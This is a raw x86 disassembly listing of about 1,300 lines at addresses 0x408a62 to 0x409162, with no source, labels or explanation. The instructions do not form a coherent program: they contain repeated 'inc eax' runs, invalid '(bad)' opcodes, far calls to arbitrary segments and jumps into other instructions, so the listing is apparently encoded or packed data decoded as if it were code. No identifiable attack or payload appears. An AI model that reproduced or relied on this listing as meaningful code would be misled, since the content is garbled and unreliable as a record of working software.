  408a62:	addr16 inc edx
  408a64:	inc    ecx
  408a65:	xchg   esi,eax
  408a66:	cmp    eax,0x407d1805
  408a6b:	xchg   ecx,eax
  408a6c:	lods   al,BYTE PTR gs:[esi]
  408a6e:	ret    
  408a6f:	arpl   WORD PTR [eax+0x40],ax
  408a72:	inc    eax
  408a73:	inc    eax
  408a74:	inc    eax
  408a75:	inc    eax
  408a76:	inc    eax
  408a77:	inc    eax
  408a78:	add    BYTE PTR [eax-0x1fbefc82],ch
  408a7e:	adc    eax,0x211041bf
  408a83:	inc    eax
  408a84:	jno    0x408aec
  408a86:	leave  
  408a87:	mov    edi,0x4a59b4a8
  408a8c:	js     0x408a9c
  408a8e:	push   ecx
  408a8f:	mov    esi,0x404040c3
  408a94:	inc    eax
  408a95:	inc    eax
  408a96:	inc    eax
  408a97:	and    eax,0x5404040
  408a9c:	inc    ebp
  408a9d:	loopne 0x408a30
  408a9f:	ins    BYTE PTR es:[edi],dx
  408aa0:	inc    ecx
  408aa1:	ror    BYTE PTR [ebx+ecx*8-0x36],1
  408aa5:	inc    eax
  408aa6:	jbe    0x408afa
  408aa8:	leave  
  408aa9:	push   esi
  408aaa:	inc    ebp
  408aab:	inc    esp
  408aac:	push   edx
  408aad:	dec    ebp
  408aae:	inc    eax
  408aaf:	inc    eax
  408ab0:	inc    eax
  408ab1:	inc    eax
  408ab2:	inc    eax
  408ab3:	inc    eax
  408ab4:	inc    eax
  408ab5:	inc    eax
  408ab6:	inc    eax
  408ab7:	inc    eax
  408ab8:	jb     0x408a7f
  408aba:	xor    al,0x40
  408abc:	dec    ecx
  408abd:	inc    esp
  408abe:	sub    BYTE PTR [eax-0x61],al
  408ac1:	cmc    
  408ac2:	bound  esi,QWORD PTR [esi-0x4]
  408ac5:	cld    
  408ac6:	cs ins BYTE PTR es:[edi],dx
  408ac8:	xor    eax,0x4a982ef1
  408acd:	sbb    edi,DWORD PTR fs:[edx]
  408ad0:	je     0x408b1f
  408ad2:	xor    eax,0xf2a8c453
  408ad7:	inc    eax
  408ad8:	inc    eax
  408ad9:	inc    eax
  408ada:	inc    eax
  408adb:	inc    eax
  408adc:	inc    eax
  408add:	rol    DWORD PTR [eax+0x40],0x42
  408ae1:	xor    esp,DWORD PTR [eax]
  408ae3:	push   eax
  408ae4:	mov    al,ds:0x24484240
  408ae9:	push   0x441502b8
  408aee:	sub    bh,BYTE PTR [eax+eax*2-0x4b]
  408af2:	push   0x4182057b
  408af7:	inc    ebx
  408af8:	inc    eax
  408af9:	inc    eax
  408afa:	add    BYTE PTR [eax+0x40],al
  408afd:	inc    eax
  408afe:	inc    eax
  408aff:	inc    eax
  408b00:	inc    eax
  408b01:	xor    cl,BYTE PTR [ebx-0x5f]
  408b04:	mov    al,0xe6
  408b06:	xor    edx,DWORD PTR [ebx+0x2e]
  408b09:	dec    eax
  408b0a:	mov    bl,0xe
  408b0c:	inc    ebx
  408b0d:	(bad)  
  408b0e:	iret   
  408b0f:	xor    al,0x2d
  408b11:	and    cl,BYTE PTR [edx+0x6c]
  408b14:	cwde   
  408b15:	mov    al,ds:0x40ca1242
  408b1a:	cmc    
  408b1b:	push   edx
  408b1c:	aam    0x15
  408b1e:	stos   DWORD PTR es:[edi],eax
  408b1f:	mov    ah,0x1d
  408b21:	daa    
  408b22:	inc    eax
  408b23:	inc    eax
  408b24:	inc    eax
  408b25:	inc    eax
  408b26:	inc    eax
  408b27:	inc    eax
  408b28:	inc    eax
  408b29:	inc    eax
  408b2a:	inc    eax
  408b2b:	inc    eax
  408b2c:	dec    ecx
  408b2d:	int    0x39
  408b2f:	inc    ecx
  408b30:	mov    edi,0x1e56e3c6
  408b35:	xor    BYTE PTR [ecx-0x72],ah
  408b38:	mov    BYTE PTR [esi],ch
  408b3a:	pop    ds
  408b3b:	inc    edx
  408b3c:	adc    al,0x1d
  408b3e:	sub    edx,esi
  408b40:	ret    
  408b41:	push   ecx
  408b42:	push   0x60
  408b44:	inc    eax
  408b45:	gs pop ds
  408b47:	push   0x42
  408b49:	inc    esp
  408b4a:	jecxz  0x408bc2
  408b4c:	push   ecx
  408b4d:	push   cs
  408b4e:	sub    BYTE PTR ds:0x4040c944,ah
  408b54:	inc    eax
  408b55:	inc    eax
  408b56:	inc    eax
  408b57:	inc    eax
  408b58:	int3   
  408b59:	jne    0x408b9b
  408b5b:	fwait
  408b5c:	inc    eax
  408b5d:	cmp    eax,0xc063ec6c
  408b62:	es xchg esi,eax
  408b64:	das    
  408b65:	inc    esp
  408b66:	push   edx
  408b67:	popa   
  408b68:	dec    esi
  408b69:	leave  
  408b6a:	mov    ah,0x2a
  408b6c:	inc    eax
  408b6d:	cmp    ebp,eax
  408b6f:	sub    esp,ecx
  408b71:	mov    esp,0x75609f0d
  408b76:	in     al,dx
  408b77:	inc    edi
  408b78:	sti    
  408b79:	or     eax,0xc1004043
  408b7e:	inc    eax
  408b7f:	inc    eax
  408b80:	inc    eax
  408b81:	inc    eax
  408b82:	add    BYTE PTR [eax+0x49],al
  408b85:	call   0xfeecc57f
  408b8a:	inc    ebx
  408b8b:	sbb    bl,ch
  408b8d:	ins    BYTE PTR es:[edi],dx
  408b8e:	jne    0x408bf5
  408b90:	data16 xor al,0x97
  408b93:	rcr    BYTE PTR [edi+0x40],0xff
  408b97:	push   cs
  408b98:	rcr    dh,cl
  408b9a:	push   esp
  408b9b:	clc    
  408b9c:	aad    0x32
  408b9e:	jne    0x408c0c
  408ba0:	push   0xffffff9c
  408ba2:	xor    al,0x40
  408ba4:	inc    eax
  408ba5:	inc    eax
  408ba6:	inc    eax
  408ba7:	inc    eax
  408ba8:	inc    eax
  408ba9:	inc    eax
  408baa:	inc    eax
  408bab:	inc    DWORD PTR [eax+0x40]
  408bae:	pop    edx
  408baf:	in     al,0xff
  408bb1:	push   edx
  408bb2:	xchg   esp,eax
  408bb3:	adc    eax,0x404eb1e5
  408bb8:	jne    0x408b76
  408bba:	(bad)  
  408bbb:	leave  
  408bbc:	jb     0x408c2a
  408bbe:	stos   DWORD PTR es:[edi],eax
  408bbf:	sub    al,0xff
  408bc1:	and    dh,0x41
  408bc4:	push   esi
  408bc5:	or     al,0xef
  408bc7:	test   BYTE PTR [eax+0x4d],cl
  408bca:	cmp    BYTE PTR [ecx+0x4f],al
  408bcd:	imul   eax,DWORD PTR [eax+0x40],0x40
  408bd1:	inc    eax
  408bd2:	inc    eax
  408bd3:	inc    eax
  408bd4:	inc    eax
  408bd5:	inc    eax
  408bd6:	inc    eax
  408bd7:	inc    eax
  408bd8:	pop    ebp
  408bd9:	inc    ecx
  408bda:	aas    
  408bdb:	and    BYTE PTR [edi+ebp*4-0x3c],cl
  408bdf:	jne    0x408c04
  408be1:	sub    al,0x48
  408be3:	mov    al,0xec
  408be5:	lods   al,BYTE PTR ds:[esi]
  408be6:	jge    0x408c4a
  408be8:	outs   dx,DWORD PTR ds:[esi]
  408be9:	inc    ecx
  408bea:	aas    
  408beb:	pop    edi
  408bec:	sub    eax,0xf640a863
  408bf1:	inc    eax
  408bf2:	inc    eax
  408bf3:	inc    eax
  408bf4:	inc    eax
  408bf5:	inc    eax
  408bf6:	inc    eax
  408bf7:	inc    eax
  408bf8:	inc    eax
  408bf9:	add    BYTE PTR [ebp+esi*2-0x5f],ah
  408bfd:	pusha  
  408bfe:	dec    ecx
  408bff:	adc    DWORD PTR [eax+0xeff4003],esi
  408c05:	cmp    al,0x61
  408c07:	inc    eax
  408c08:	lds    ebp,FWORD PTR [si-0x41]
  408c0c:	ins    BYTE PTR es:[edi],dx
  408c0d:	in     al,dx
  408c0e:	icebp  
  408c0f:	inc    eax
  408c10:	mov    esi,0x40404040
  408c15:	inc    eax
  408c16:	inc    eax
  408c17:	and    eax,0x37404040
  408c1c:	out    dx,al
  408c1d:	dec    edi
  408c1e:	push   edx
  408c1f:	les    esp,FWORD PTR [edx+0x40]
  408c22:	inc    ecx
  408c23:	out    0x40,al
  408c25:	push   ecx
  408c26:	arpl   WORD PTR [ebp-0x3b],bp
  408c29:	clc    
  408c2a:	popf   
  408c2b:	mov    ds:0xcc2c2438,eax
  408c30:	aam    0xc8
  408c32:	addr16 mov ah,0x40
  408c35:	icebp  
  408c36:	repnz push di
  408c39:	retf   
  408c3a:	inc    esp
  408c3b:	cld    
  408c3c:	xor    eax,0x40c40e40
  408c41:	inc    eax
  408c42:	inc    eax
  408c43:	inc    eax
  408c44:	inc    eax
  408c45:	inc    eax
  408c46:	inc    eax
  408c47:	inc    eax
  408c48:	inc    eax
  408c49:	inc    eax
  408c4a:	test   al,0x44
  408c4c:	int    0x68
  408c4e:	inc    eax
  408c4f:	shr    BYTE PTR [edi+ecx*2+0x11],cl
  408c53:	add    cl,ch
  408c55:	dec    esi
  408c56:	and    eax,0x48395229
  408c5b:	dec    eax
  408c5c:	mov    edx,0xd55d64b0
  408c61:	inc    edi
  408c62:	inc    ecx
  408c63:	mov    BYTE PTR [esi-0x65],cl
  408c66:	inc    eax
  408c67:	rcl    ecx,1
  408c69:	inc    eax
  408c6a:	inc    eax
  408c6b:	inc    eax
  408c6c:	inc    eax
  408c6d:	inc    eax
  408c6e:	inc    eax
  408c6f:	rol    DWORD PTR [eax+0x40],0x65
  408c73:	jp     0x408c9d
  408c75:	cmp    eax,0x196b23cc
  408c7a:	dec    edi
  408c7b:	fdiv   DWORD PTR [edx-0x35]
  408c7e:	mov    eax,DWORD PTR [edx+0x53]
  408c81:	fdivr  QWORD PTR gs:[ebp+esi*1+0x42405f50]
  408c89:	xor    esi,DWORD PTR [edx]
  408c8b:	inc    eax
  408c8c:	adc    eax,DWORD PTR [eax+0x40]
  408c8f:	add    BYTE PTR [eax+0x40],al
  408c92:	inc    eax
  408c93:	inc    eax
  408c94:	inc    eax
  408c95:	inc    eax
  408c96:	dec    esp
  408c97:	cmp    esp,DWORD PTR ds:0x111d8cf0
  408c9d:	(bad)  
  408c9e:	leave  
  408c9f:	xor    al,cl
  408ca1:	and    al,0x52
  408ca3:	test   al,0x6b
  408ca5:	bound  esp,QWORD PTR [esi]
  408ca7:	pop    esp
  408ca8:	inc    edx
  408ca9:	inc    eax
  408caa:	inc    eax
  408cab:	inc    eax
  408cac:	inc    eax
  408cad:	inc    eax
  408cae:	inc    eax
  408caf:	inc    eax
  408cb0:	inc    eax
  408cb1:	inc    eax
  408cb2:	inc    eax
  408cb3:	scas   al,BYTE PTR es:[edi]
  408cb4:	arpl   WORD PTR [ecx],dx
  408cb6:	dec    esi
  408cb7:	jns    0x408c75
  408cb9:	ja     0x408d1b
  408cbb:	jbe    0x408ce9
  408cbd:	dec    esp
  408cbe:	ror    WORD PTR ds:0x63f7381f,0x8
  408cc6:	(bad)  
  408cc7:	loop   0x408d0d
  408cc9:	add    eax,0xcb337640
  408cce:	inc    eax
  408ccf:	inc    eax
  408cd0:	inc    eax
  408cd1:	inc    eax
  408cd2:	inc    eax
  408cd3:	inc    eax
  408cd4:	int3   
  408cd5:	jne    0x408d17
  408cd7:	fiadd  DWORD PTR [bx+si-0x56]
  408cdb:	and    eax,0x674c98ff
  408ce0:	arpl   WORD PTR [eax+0x527648ad],bp
  408ce6:	inc    ebp
  408ce7:	add    BYTE PTR [ecx+esi*2-0x3a00bfc1],bh
  408cee:	ja     0x408d54
  408cf0:	(bad)  
  408cf1:	leave  
  408cf2:	xor    ch,BYTE PTR [esi+esi*2]
  408cf5:	inc    eax
  408cf6:	add    cl,al
  408cf8:	inc    eax
  408cf9:	inc    eax
  408cfa:	inc    eax
  408cfb:	inc    eax
  408cfc:	add    BYTE PTR [eax+0x4b],al
  408cff:	rcl    al,0xc
  408d02:	or     eax,0xfdff6a60
  408d07:	arpl   WORD PTR [edx-0x70],ax
  408d0a:	and    eax,0x5f1a4034
  408d0f:	xchg   ecx,eax
  408d10:	xor    eax,0x29a540a9
  408d15:	aas    
  408d16:	sub    al,0xa9
  408d18:	arpl   ax,sp
  408d1a:	test   al,0x35
  408d1c:	jo     0x408d92
  408d1e:	and    al,0x40
  408d20:	inc    eax
  408d21:	inc    eax
  408d22:	inc    eax
  408d23:	inc    eax
  408d24:	inc    eax
  408d25:	inc    eax
  408d26:	inc    eax
  408d27:	inc    DWORD PTR [eax-0x4c]
  408d2a:	gs push 0x67
  408d2d:	sub    BYTE PTR [eax-0x5d],al
  408d30:	arpl   WORD PTR [ebp+0x2d],cx
  408d33:	xchg   ecx,eax
  408d34:	inc    edx
  408d35:	retf   0x1936
  408d38:	mov    ebp,0x4c7c663b
  408d3d:	pop    ds
  408d3e:	shl    BYTE PTR [edx],1
  408d40:	xor    eax,DWORD PTR [eax+0x40]
  408d43:	inc    eax
  408d44:	inc    eax
  408d45:	inc    eax
  408d46:	inc    eax
  408d47:	inc    eax
  408d48:	inc    eax
  408d49:	inc    eax
  408d4a:	inc    eax
  408d4b:	outs   dx,BYTE PTR ds:[esi]
  408d4c:	js     0x408db2
  408d4e:	leave  
  408d4f:	out    dx,eax
  408d50:	inc    eax
  408d51:	and    DWORD PTR [eax+0x26e628bf],ebx
  408d57:	pop    es
  408d58:	xor    bh,BYTE PTR [esi+0x52904852]
  408d5e:	mov    ah,0xf6
  408d60:	inc    eax
  408d61:	sbb    BYTE PTR [edi+0x42d56763],dh
  408d67:	pop    ebp
  408d68:	xor    al,0x21
  408d6a:	mov    esp,0x494c17aa
  408d6f:	inc    eax
  408d70:	inc    eax
  408d71:	inc    eax
  408d72:	inc    eax
  408d73:	inc    eax
  408d74:	inc    eax
  408d75:	inc    eax
  408d76:	inc    eax
  408d77:	add    bl,dh
  408d79:	push   0x63673350
  408d7e:	mov    ch,ah
  408d80:	es inc eax
  408d82:	ja     0x408d1c
  408d84:	push   esp
  408d85:	ror    ch,0x6d
  408d88:	call   0x6248:0x7d525060
  408d8f:	mov    esp,0x487f40f6
  408d94:	frstor ds:0x33870dc3
  408d9a:	push   eax
  408d9b:	mov    esp,0x40404040
  408da0:	inc    eax
  408da1:	inc    eax
  408da2:	and    eax,0x56404040
  408da7:	jns    0x408df9
  408da9:	leave  
  408daa:	dec    ebx
  408dab:	inc    eax
  408dac:	jg     0x408de1
  408dae:	pop    eax
  408daf:	test   al,0xc5
  408db1:	es inc edi
  408db3:	and    DWORD PTR [edi-0x68],edi
  408db6:	inc    eax
  408db7:	inc    eax
  408db8:	inc    eax
  408db9:	inc    eax
  408dba:	inc    eax
  408dbb:	inc    eax
  408dbc:	inc    eax
  408dbd:	inc    eax
  408dbe:	inc    eax
  408dbf:	inc    eax
  408dc0:	addr16 nop
  408dc2:	ret    0x1250
  408dc5:	inc    eax
  408dc6:	and    DWORD PTR [edx+0x41],edx
  408dc9:	and    ah,BYTE PTR [ebx+0x4c]
  408dcc:	ins    BYTE PTR es:[edi],dx
  408dcd:	xor    BYTE PTR [eax+0x7a],cl
  408dd0:	in     al,dx
  408dd1:	jns    0x408dfb
  408dd3:	retf   
  408dd4:	xchg   ebx,eax
  408dd5:	inc    eax
  408dd6:	mov    al,ds:0xa8287c8c
  408ddb:	inc    eax
  408ddc:	inc    eax
  408ddd:	inc    eax
  408dde:	inc    eax
  408ddf:	inc    eax
  408de0:	inc    eax
  408de1:	rol    DWORD PTR [eax+0x40],0x26
  408de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de6:	imul   BYTE PTR [esi]
  408de8:	arpl   WORD PTR [ebp+0x2b],si
  408deb:	adc    BYTE PTR [ebp+0x3d],al
  408dee:	adc    al,0x15
  408df0:	cmp    al,0x7d
  408df2:	xor    al,0xb4
  408df4:	inc    ebx
  408df5:	rol    DWORD PTR [eax+0x40],1
  408df8:	add    BYTE PTR [eax+0x40],al
  408dfb:	inc    eax
  408dfc:	inc    eax
  408dfd:	inc    eax
  408dfe:	inc    eax
  408dff:	or     esp,DWORD PTR [ecx+0x4167621c]
  408e05:	and    al,0xd
  408e07:	cmc    
  408e08:	mov    ebp,0x5f26465a
  408e0d:	xchg   ecx,eax
  408e0e:	ret    
  408e0f:	std    
  408e10:	push   esp
  408e11:	mov    ebp,0x40246390
  408e16:	inc    eax
  408e17:	inc    eax
  408e18:	inc    eax
  408e19:	inc    eax
  408e1a:	inc    eax
  408e1b:	inc    eax
  408e1c:	inc    eax
  408e1d:	inc    eax
  408e1e:	inc    eax
  408e1f:	or     ebp,DWORD PTR [eax+0x80520f5]
  408e25:	dec    ecx
  408e26:	ins    BYTE PTR es:[edi],dx
  408e27:	shl    DWORD PTR [edx-0x36],0x1f
  408e2b:	fs test al,0x9c
  408e2e:	loopne 0x408e29
  408e30:	not    BYTE PTR [ebx-0x2ee9db2]
  408e36:	push   edx
  408e37:	push   esp
  408e38:	retf   
  408e39:	or     esp,DWORD PTR [ecx-0x3b]
  408e3c:	dec    eax
  408e3d:	inc    eax
  408e3e:	inc    eax
  408e3f:	inc    eax
  408e40:	inc    eax
  408e41:	inc    eax
  408e42:	inc    eax
  408e43:	int3   
  408e44:	jne    0x408e86
  408e46:	sbb    BYTE PTR [eax],0xee
  408e49:	cmp    al,0x77
  408e4b:	inc    ecx
  408e4c:	(bad)  [eax]
  408e4e:	test   al,0xd0
  408e50:	xor    al,cl
  408e52:	dec    ebx
  408e53:	pusha  
  408e54:	mov    ebx,ecx
  408e56:	adc    BYTE PTR [edx+0x63],ah
  408e59:	sub    DWORD PTR [ecx+0x42436525],esi
  408e5f:	test   eax,0x40ec84
  408e64:	rol    DWORD PTR [eax+0x40],0x40
  408e68:	inc    eax
  408e69:	add    BYTE PTR [eax+0x5f],al
  408e6c:	xor    ecx,DWORD PTR ss:[edi]
  408e6f:	inc    esi
  408e70:	or     BYTE PTR [edi+ecx*1],cl
  408e73:	inc    edi
  408e74:	jecxz  0x408e0e
  408e76:	cmp    al,0x4
  408e78:	fs int 0x2a
  408e7b:	mov    dl,0x5b
  408e7d:	push   edx
  408e7e:	dec    eax
  408e7f:	int    0x87
  408e81:	inc    ecx
  408e82:	inc    eax
  408e83:	inc    eax
  408e84:	inc    eax
  408e85:	inc    eax
  408e86:	inc    eax
  408e87:	inc    eax
  408e88:	inc    eax
  408e89:	inc    eax
  408e8a:	inc    DWORD PTR [eax-0x47]
  408e8d:	sub    DWORD PTR [edx-0x1cbb37f2],esp
  408e93:	sub    dl,BYTE PTR [ebx+0x5d]
  408e96:	bound  edx,QWORD PTR [eax]
  408e98:	rol    BYTE PTR [ebp+eiz*8-0x9aeedf0],1
  408e9f:	push   esi
  408ea0:	inc    esi
  408ea1:	ret    
  408ea2:	arpl   WORD PTR [ecx-0x45],si
  408ea5:	ja     0x408e39
  408ea7:	xor    esp,DWORD PTR ds:0xd4975848
  408ead:	push   edx
  408eae:	and    BYTE PTR [eax+0x40406d3c],bl
  408eb4:	inc    eax
  408eb5:	inc    eax
  408eb6:	inc    eax
  408eb7:	inc    eax
  408eb8:	inc    eax
  408eb9:	inc    eax
  408eba:	inc    eax
  408ebb:	inc    eax
  408ebc:	adc    eax,0x2d2d8e62
  408ec1:	push   edx
  408ec2:	test   al,0xc8
  408ec4:	retf   
  408ec5:	sub    dh,dh
  408ec7:	pop    ebx
  408ec8:	jb     0x408e97
  408eca:	adc    DWORD PTR [edx-0x74],esp
  408ecd:	mov    eax,0xcde13750
  408ed2:	inc    eax
  408ed3:	inc    eax
  408ed4:	inc    eax
  408ed5:	inc    eax
  408ed6:	inc    eax
  408ed7:	inc    eax
  408ed8:	inc    eax
  408ed9:	inc    eax
  408eda:	add    BYTE PTR [eax-0x58],cl
  408edd:	inc    ecx
  408ede:	add    dl,BYTE PTR [edx+0x41ed55f4]
  408ee4:	adc    al,BYTE PTR [esi-0x1e2c5ff4]
  408eea:	push   ecx
  408eeb:	xor    dh,BYTE PTR [esp+edx*4+0x54f894c9]
  408ef2:	cmp    al,0x2c
  408ef4:	jg     0x408f03
  408ef6:	es add ecx,edx
  408ef9:	and    BYTE PTR [esi*2+0x40b4cba3],dl
  408f00:	inc    eax
  408f01:	inc    eax
  408f02:	inc    eax
  408f03:	inc    eax
  408f04:	inc    eax
  408f05:	and    eax,0xe5404040
  408f0a:	imul   DWORD PTR [edi]
  408f0c:	stos   BYTE PTR es:[edi],al
  408f0d:	and    bl,BYTE PTR [edx+0x55]
  408f10:	adc    eax,0xad5643a7
  408f15:	rol    DWORD PTR [eax+0x47],1
  408f18:	inc    eax
  408f19:	inc    eax
  408f1a:	inc    eax
  408f1b:	inc    eax
  408f1c:	inc    eax
  408f1d:	inc    eax
  408f1e:	inc    eax
  408f1f:	inc    eax
  408f20:	inc    eax
  408f21:	inc    eax
  408f22:	retf   
  408f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f24:	push   ecx
  408f25:	out    0x33,eax
  408f27:	je     0x408f4d
  408f29:	adc    eax,0x98559789
  408f2e:	cwde   
  408f2f:	cld    
  408f30:	pop    esp
  408f31:	and    BYTE PTR [eax+0x40],al
  408f34:	inc    eax
  408f35:	inc    eax
  408f36:	inc    eax
  408f37:	inc    eax
  408f38:	rol    DWORD PTR [eax+0x40],0x73
  408f3c:	or     cl,dh
  408f3e:	loopne 0x408f92
  408f40:	fs ffree st(4)
  408f43:	dec    eax
  408f44:	mov    WORD PTR [ecx-0x5],cs
  408f47:	pusha  
  408f48:	jno    0x408ef2
  408f4a:	ins    BYTE PTR es:[edi],dx
  408f4b:	dec    ebx
  408f4c:	mov    esi,0x30581f11
  408f51:	adc    DWORD PTR [ebx-0x20],esp
  408f54:	neg    DWORD PTR [ecx+0x50]
  408f57:	gs dec sp
  408f5a:	push   edi
  408f5b:	xor    ch,bl
  408f5d:	xor    eax,0x40633324
  408f62:	inc    eax
  408f63:	add    BYTE PTR [eax+0x40],al
  408f66:	inc    eax
  408f67:	inc    eax
  408f68:	inc    eax
  408f69:	inc    eax
  408f6a:	inc    ecx
  408f6b:	test   al,0xa8
  408f6d:	sbb    BYTE PTR [ebx+0x6f],bl
  408f70:	cwde   
  408f71:	enter  0xc813,0x12
  408f75:	push   esi
  408f76:	mov    ch,0x43
  408f78:	push   edx
  408f79:	xor    eax,0x94b4c258
  408f7e:	push   0x25
  408f80:	int    0x40
  408f82:	inc    eax
  408f83:	inc    eax
  408f84:	inc    eax
  408f85:	inc    eax
  408f86:	inc    eax
  408f87:	inc    eax
  408f88:	inc    eax
  408f89:	inc    eax
  408f8a:	inc    eax
  408f8b:	cmp    eax,0x86156362
  408f90:	push   edi
  408f91:	inc    esp
  408f92:	and    DWORD PTR [eax-0x3abdab90],ebp
  408f98:	push   0x60
  408f9a:	or     DWORD PTR [esi+0xd],ebx
  408f9d:	adc    eax,0x4040b254
  408fa2:	inc    eax
  408fa3:	inc    eax
  408fa4:	inc    eax
  408fa5:	inc    eax
  408fa6:	int3   
  408fa7:	jne    0x408fe9
  408fa9:	pop    edi
  408faa:	daa    
  408fab:	push   ebp
  408fac:	aaa    
  408fad:	pop    ebp
  408fae:	retf   
  408faf:	xor    BYTE PTR [edi-0x12],bh
  408fb2:	pop    eax
  408fb3:	xor    edx,DWORD PTR [eax-0x3969ee9e]
  408fb9:	inc    eax
  408fba:	add    cl,al
  408fbc:	inc    eax
  408fbd:	inc    eax
  408fbe:	inc    eax
  408fbf:	inc    eax
  408fc0:	add    BYTE PTR [eax+0x73],al
  408fc3:	and    DWORD PTR [eax+0x25410fbf],ebx
  408fc9:	add    DWORD PTR [edi+0x3b445242],edi
  408fcf:	jne    0x408ff2
  408fd1:	mov    ebp,0x3a0320cf
  408fd6:	bound  ebp,QWORD PTR [eax]
  408fd8:	dec    edx
  408fd9:	and    al,0xd3
  408fdb:	sbb    ebp,DWORD PTR [eax+eax*8+0x5ec862b6]
  408fe2:	ins    BYTE PTR es:[edi],dx
  408fe3:	and    DWORD PTR [ebx],esi
  408fe5:	inc    edx
  408fe6:	inc    eax
  408fe7:	inc    eax
  408fe8:	inc    eax
  408fe9:	inc    eax
  408fea:	inc    eax
  408feb:	inc    eax
  408fec:	inc    eax
  408fed:	inc    eax
  408fee:	inc    DWORD PTR [eax+0x63]
  408ff1:	adc    BYTE PTR [ecx-0x59],dl
  408ff4:	xor    DWORD PTR [ecx],esp
  408ff6:	cwde   
  408ff7:	and    DWORD PTR [ecx],edx
  408ff9:	mov    al,0xf6
  408ffb:	mov    ebx,0xee526166
  409000:	push   eax
  409001:	add    eax,0x55198a8
  409006:	aad    0xa8
  409008:	and    DWORD PTR ds:0xa1c82911,0x9bc34fce
  409012:	mov    ah,0xa0
  409014:	inc    eax
  409015:	inc    eax
  409016:	inc    eax
  409017:	inc    eax
  409018:	inc    eax
  409019:	inc    eax
  40901a:	inc    eax
  40901b:	inc    eax
  40901c:	inc    eax
  40901d:	inc    eax
  40901e:	mov    bl,0x40
  409020:	fldenv [edx]
  409022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409023:	fs or  eax,0x5520548b
  409029:	inc    esi
  40902a:	inc    edx
  40902b:	xchg   esp,eax
  40902c:	int    0xe
  40902e:	repz sub esi,DWORD PTR [ebx]
  409031:	fsub   QWORD PTR [edi]
  409033:	or     eax,0x63a5ce44
  409038:	cwde   
  409039:	ins    BYTE PTR es:[edi],dx
  40903a:	and    bl,cl
  40903c:	sub    BYTE PTR [eax],bl
  40903e:	push   esi
  40903f:	inc    eax
  409040:	inc    eax
  409041:	inc    eax
  409042:	inc    eax
  409043:	inc    eax
  409044:	inc    eax
  409045:	inc    eax
  409046:	inc    eax
  409047:	add    dl,ah
  409049:	push   edx
  40904a:	inc    esi
  40904b:	add    dl,BYTE PTR [esp+ecx*4+0x656e2ea6]
  409052:	(bad)  
  409054:	add    eax,0x50a80941
  409059:	pop    esp
  40905a:	jmp    DWORD PTR [ecx+ecx*8+0x2173adec]
  409061:	inc    eax
  409062:	inc    eax
  409063:	inc    eax
  409064:	inc    eax
  409065:	inc    eax
  409066:	inc    eax
  409067:	and    eax,0x66404040
  40906c:	test   al,0x15
  40906e:	inc    ebx
  40906f:	or     DWORD PTR [esi],ebx
  409071:	mov    ebp,0x41103335
  409076:	in     eax,dx
  409077:	inc    edi
  409078:	retf   0x4039
  40907b:	cwde   
  40907c:	mov    ebp,0x40404040
  409081:	inc    eax
  409082:	inc    eax
  409083:	inc    eax
  409084:	inc    eax
  409085:	inc    eax
  409086:	inc    eax
  409087:	fnstsw WORD PTR [ebp+ebx*8-0x30]
  40908b:	jne    0x4090ed
  40908d:	push   edx
  40908e:	jecxz  0x4090bc
  409090:	bound  edx,QWORD PTR [edx+0x34]
  409093:	enter  0x686f,0x62
  409097:	or     edi,0xfffffff4
  40909a:	pop    ss
  40909b:	adc    ebp,DWORD PTR [eax]
  40909d:	lods   al,BYTE PTR ds:[esi]
  40909e:	xor    eax,0x404040c4
  4090a3:	inc    eax
  4090a4:	inc    eax
  4090a5:	inc    eax
  4090a6:	rol    DWORD PTR [eax+0x40],0xd4
  4090aa:	adc    eax,0x33a2419b
  4090af:	mov    cl,0x4f
  4090b1:	jmp    0x4090fb
  4090b3:	push   0xffffffd1
  4090b5:	xor    al,0x98
  4090b7:	or     edx,ebx
  4090b9:	fsubr  QWORD PTR ds:0x40404faa
  4090bf:	add    BYTE PTR [eax+0x40],al
  4090c2:	inc    eax
  4090c3:	inc    eax
  4090c4:	inc    eax
  4090c5:	inc    eax
  4090c6:	sub    al,0x52
  4090c8:	bound  ecx,QWORD PTR [edi+0x43]
  4090cb:	retf   
  4090cc:	jae    0x40911f
  4090ce:	loope  0x4090a5
  4090d0:	jo     0x409138
  4090d2:	mov    al,0x4c
  4090d4:	push   cs
  4090d5:	ss jae 0x409117
  4090d8:	cwde   
  4090d9:	inc    esi
  4090da:	adc    eax,0x2199c9f5
  4090df:	jmp    0x520bb947
  4090e4:	inc    eax
  4090e5:	dec    ebp
  4090e6:	aaa    
  4090e7:	inc    eax
  4090e8:	inc    eax
  4090e9:	inc    eax
  4090ea:	inc    eax
  4090eb:	inc    eax
  4090ec:	inc    eax
  4090ed:	inc    eax
  4090ee:	inc    eax
  4090ef:	inc    eax
  4090f0:	inc    eax
  4090f1:	gs gs stc 
  4090f4:	adc    DWORD PTR [ecx+0x40],edx
  4090f7:	shl    DWORD PTR [ecx+0x42a25c33],cl
  4090fd:	lds    eax,FWORD PTR [eax+0x43]
  409100:	call   0x4040:0x40a86898
  409107:	inc    eax
  409108:	inc    eax
  409109:	inc    eax
  40910a:	int3   
  40910b:	jne    0x40914d
  40910d:	out    0x30,al
  40910f:	or     al,0x35
  409111:	popa   
  409112:	push   edx
  409113:	mov    dh,0x11
  409115:	push   esp
  409116:	push   esp
  409117:	inc    eax
  409118:	(bad)  
  409119:	out    dx,eax
  40911a:	push   esi
  40911b:	pop    eax
  40911c:	dec    esp
  40911d:	(bad)  
  40911e:	leave  
  40911f:	adc    dh,BYTE PTR [ecx+0x64]
  409122:	lods   al,BYTE PTR ds:[esi]
  409123:	arpl   WORD PTR [eax],cx
  409125:	xchg   ecx,eax
  409126:	es inc eax
  409128:	mov    edi,0xcb583362
  40912d:	add    BYTE PTR [eax+0x407a15],bh
  409133:	rol    DWORD PTR [eax+0x40],0x40
  409137:	inc    eax
  409138:	add    BYTE PTR [eax+0x7c],al
  40913b:	cwde   
  40913c:	adc    eax,0x404264a4
  409141:	jne    0x4090c6
  409143:	push   edx
  409144:	retf   
  409145:	inc    ebp
  409146:	inc    edx
  409147:	sbb    ch,BYTE PTR [esi+0x2a]
  40914a:	mov    eax,ds:0x34b45748
  40914f:	les    eax,FWORD PTR [eax+0x40]
  409152:	inc    eax
  409153:	inc    eax
  409154:	inc    eax
  409155:	inc    eax
  409156:	inc    eax
  409157:	inc    eax
  409158:	inc    DWORD PTR [eax+0x40]
  40915b:	aad    0x66
  40915d:	mov    esp,0x6b06bc41
  409162:	push   cs
